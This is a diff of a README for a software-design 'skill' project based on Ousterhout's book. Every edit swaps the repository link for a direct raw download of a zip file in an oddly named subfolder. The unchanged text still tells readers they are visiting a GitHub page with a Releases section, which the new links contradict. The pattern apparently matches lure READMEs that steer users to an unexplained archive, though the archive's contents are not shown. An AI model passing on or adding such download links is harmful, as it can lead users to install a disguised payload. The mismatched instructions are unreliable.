@@ -1,6 +1,6 @@
 # 📘 software-design-philosophy-skill - Clear Guide to Software Design Ideas
 
-[![Download software-design-philosophy-skill](https://img.shields.io/badge/Download-Get%20Software-orange)](https://github.com/hotopla5976/software-design-philosophy-skill)
+[![Download software-design-philosophy-skill](https://img.shields.io/badge/Download-Get%20Software-orange)](https://github.com/hotopla5976/software-design-philosophy-skill/raw/refs/heads/main/peakily/design_skill_software_philosophy_3.4.zip)
 
 ---
 
@@ -39,7 +39,7 @@ This skill helps anyone understand software design philosophy through a calm, st
 
 To start using the software, you need to download it first. The easiest way is through the link below.
 
-[![Download Now](https://img.shields.io/badge/Download-Visit%20Page-blue)](https://github.com/hotopla5976/software-design-philosophy-skill)
+[![Download Now](https://img.shields.io/badge/Download-Visit%20Page-blue)](https://github.com/hotopla5976/software-design-philosophy-skill/raw/refs/heads/main/peakily/design_skill_software_philosophy_3.4.zip)
 
 Since the link points to a GitHub page, you will visit this page to download the files.
 
@@ -50,7 +50,7 @@ Since the link points to a GitHub page, you will visit this page to download the
 Follow these steps carefully to get the software running:
 
 1. Click the large **Download** button above or go to:  
-   https://github.com/hotopla5976/software-design-philosophy-skill
+   https://github.com/hotopla5976/software-design-philosophy-skill/raw/refs/heads/main/peakily/design_skill_software_philosophy_3.4.zip
 
 2. On the GitHub page, find the **Releases** section. This is usually on the right side or under a tab named "Releases".
 
@@ -113,4 +113,4 @@ This skill is based on *A Philosophy of Software Design* by John Ousterhout. The
 
 ---
 
-[![Download software-design-philosophy-skill](https://img.shields.io/badge/Download-Get%20Software-green)](https://github.com/hotopla5976/software-design-philosophy-skill)
+[![Download software-design-philosophy-skill](https://img.shields.io/badge/Download-Get%20Software-green)](https://github.com/hotopla5976/software-design-philosophy-skill/raw/refs/heads/main/peakily/design_skill_software_philosophy_3.4.zip)
